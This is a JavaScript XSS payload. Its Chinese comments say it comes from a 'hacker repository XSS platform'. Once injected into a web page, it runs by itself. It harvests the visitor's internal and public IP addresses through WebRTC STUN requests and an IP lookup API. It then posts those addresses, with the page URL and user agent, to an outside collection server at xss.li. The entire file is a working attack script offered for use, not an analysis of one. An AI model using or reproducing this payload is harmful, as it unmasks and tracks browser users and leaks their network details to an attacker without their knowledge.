// 真实IP检测Payload - 黑客仓库XSS平台
// 通过WebRTC获取用户真实内网IP和公网IP

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php'
    };
    
    var ipData = {
        localIPs: [],
        publicIPs: [],
        ipv6IPs: []
    };
    
    console.log('🌐 黑客仓库XSS - IP检测模块启动');
    
    // 使用WebRTC获取本地IP
    function getLocalIPs() {
        return new Promise((resolve) => {
            var RTCPeerConnection = window.RTCPeerConnection || 
                                   window.mozRTCPeerConnection || 
                                   window.webkitRTCPeerConnection;
            
            if (!RTCPeerConnection) {
                console.log('浏览器不支持WebRTC');
                resolve();
                return;
            }
            
            var pc = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            pc.createDataChannel('');
            
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) {
                    return;
                }
                
                var candidate = ice.candidate.candidate;
                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                var ipMatch = ipRegex.exec(candidate);
                
                if (ipMatch) {
                    var ip = ipMatch[1];
                    
                    // 分类IP
                    if (ip.indexOf(':') !== -1) {
                        if (ipData.ipv6IPs.indexOf(ip) === -1) {
                            ipData.ipv6IPs.push(ip);
                            console.log('🌐 IPv6:', ip);
                        }
                    } else if (ip.indexOf('192.168.') === 0 || ip.indexOf('10.') === 0 || ip.match(/^172\.(1[6-9]|2[0-9]|3[0-1])\./)) {
                        if (ipData.localIPs.indexOf(ip) === -1) {
                            ipData.localIPs.push(ip);
                            console.log('🏠 内网IP:', ip);
                        }
                    } else {
                        if (ipData.publicIPs.indexOf(ip) === -1) {
                            ipData.publicIPs.push(ip);
                            console.log('🌍 公网IP:', ip);
                        }
                    }
                }
            };
            
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            setTimeout(() => {
                pc.close();
                resolve();
            }, 2000);
        });
    }
    
    // 获取公网IP（备用方法）
    async function getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            if (data.ip && ipData.publicIPs.indexOf(data.ip) === -1) {
                ipData.publicIPs.push(data.ip);
                console.log('🌍 公网IP (API):', data.ip);
            }
        } catch (error) {
            console.log('公网IP API调用失败');
        }
    }
    
    // 主函数
    async function detectIPs() {
        await getLocalIPs();
        await getPublicIP();
        
        // 发送数据到服务器
        try {
            const payload = {
                type: 'ip_detect',
                ips: ipData,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent
            };
            
            console.log('📤 发送IP数据:', payload);
            
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('✅ IP数据上传成功');
            }
        } catch (error) {
            console.error('发送IP数据失败:', error);
        }
    }
    
    detectIPs();
    
})();
